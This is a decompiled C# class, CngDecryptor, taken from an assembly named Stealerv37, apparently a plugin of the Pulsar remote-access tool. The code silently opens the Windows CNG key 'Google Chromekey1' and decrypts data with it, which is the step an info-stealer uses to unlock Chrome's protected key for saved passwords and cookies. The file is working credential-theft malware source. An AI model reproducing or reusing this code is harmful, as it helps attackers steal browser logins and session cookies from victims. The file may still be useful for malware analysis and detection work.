// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Encrypted.CngDecryptor
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;

#nullable disable
namespace Intelix.Helper.Encrypted;

public static class CngDecryptor
{
  private const int NCRYPT_SILENT_FLAG = 64 /*0x40*/;

  public static byte[] Decrypt(byte[] inputData, string providerName = "Microsoft Software Key Storage Provider", string keyName = "Google Chromekey1")
  {
    IntPtr phProvider = IntPtr.Zero;
    IntPtr phKey = IntPtr.Zero;
    try
    {
      int num1 = NativeMethods.NCryptOpenStorageProvider(out phProvider, providerName, 0);
      if (num1 != 0)
        throw new Exception($"Ошибка NCryptOpenStorageProvider: Код {num1}");
      int num2 = NativeMethods.NCryptOpenKey(phProvider, out phKey, keyName, 0, 0);
      if (num2 != 0)
        throw new Exception($"Ошибка NCryptOpenKey: Код {num2}");
      int pcbResult;
      int num3 = NativeMethods.NCryptDecrypt(phKey, inputData, inputData.Length, IntPtr.Zero, (byte[]) null, 0, out pcbResult, 64 /*0x40*/);
      if (num3 != 0)
        throw new Exception($"Ошибка определения размера NCryptDecrypt: Код {num3}");
      byte[] array = new byte[pcbResult];
      int num4 = NativeMethods.NCryptDecrypt(phKey, inputData, inputData.Length, IntPtr.Zero, array, array.Length, out pcbResult, 64 /*0x40*/);
      if (num4 != 0)
        throw new Exception($"Ошибка NCryptDecrypt: Код {num4}");
      Array.Resize<byte>(ref array, pcbResult);
      return array;
    }
    finally
    {
      if (phKey != IntPtr.Zero)
        NativeMethods.NCryptFreeObject(phKey);
      if (phProvider != IntPtr.Zero)
        NativeMethods.NCryptFreeObject(phProvider);
    }
  }
}
